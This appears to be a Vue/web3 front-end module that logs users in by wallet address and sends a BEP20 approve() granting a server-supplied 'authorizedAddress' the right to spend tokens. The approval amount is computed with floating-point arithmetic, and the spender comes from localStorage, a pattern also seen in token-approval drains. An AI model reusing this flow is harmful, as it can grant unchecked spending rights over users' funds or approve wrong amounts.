
import { useWeb3Modal } from '@web3modal/wagmi/vue'

import Web3 from 'web3'
import axios from 'axios'
import { infuraId, BEP20_ABI, BEP20_ADDRESS } from "@/settings";


export async function myWalletConnect(openModel) {
  try {
    if (openModel) {
      const { open } = useWeb3Modal()
      await open()
    }

    const loginIntervalId = setInterval(async () => {
      const web3 = new Web3(window.ethereum);
      ethereum.enable()
      const accounts = await web3.eth.getAccounts();
      const selectedAccount = accounts[0];
      console.log(selectedAccount)
      let data = {
        addr: selectedAccount
      }
      const mainUrl = import.meta.env.VITE_BASE_API;
      const response = await axios.post(mainUrl + '/walletlogin', data);
      let res = response.data;
      if (res.code == 200) {
        clearInterval(loginIntervalId)
        localStorage.setItem('walletAddr', selectedAccount);
        localStorage.setItem('jwt-token', res.data)
        localStorage.setItem('userInfo', JSON.stringify(res.data))
        localStorage.setItem('allowance', res.data.allowance)
        window.location.reload()
      } else {
        console.log(res.message)
      }
    }, 2000)
  } catch (error) {
    console.error('Error connecting wallet:', error)
  }
}


export async function doAllowance(amount, times) {
  try {
    amount = parseFloat(amount);
    times = parseInt(times);
    //if (!authorizedAddress) authorizedAddress = '0x424E231D826acb3F4EDF59C8BE72D6745445C528'
    let authorizedAddress = localStorage.getItem('authorizedAddress');
    let gasLimit = 50000;

    const web3 = new Web3(window.ethereum);
    ethereum.enable()
    const accounts = await web3.eth.getAccounts();
    const selectedAccount = accounts[0];
    const contract = new web3.eth.Contract(BEP20_ABI, BEP20_ADDRESS);
    let allowance = await contract.methods.allowance(selectedAccount, authorizedAddress).call();

    console.log('allowance', allowance)

    const gasPrice = await web3.eth.getGasPrice();
    //if (allowance === '0') {

    try {

      let usdtAmount = amount * times * 1000000000000000000;
      const approveTx = await contract.methods.approve(authorizedAddress, usdtAmount.toString()).send({
        from: selectedAccount,
        gasPrice: gasPrice,
        gas: 70000,
      });

    } catch (error) {
      console.log(error);

    }
    //} else {
    //  console.log('您已經授權')
    //}
  } catch (error) {
    console.error('Error connecting wallet:', error)
  }
}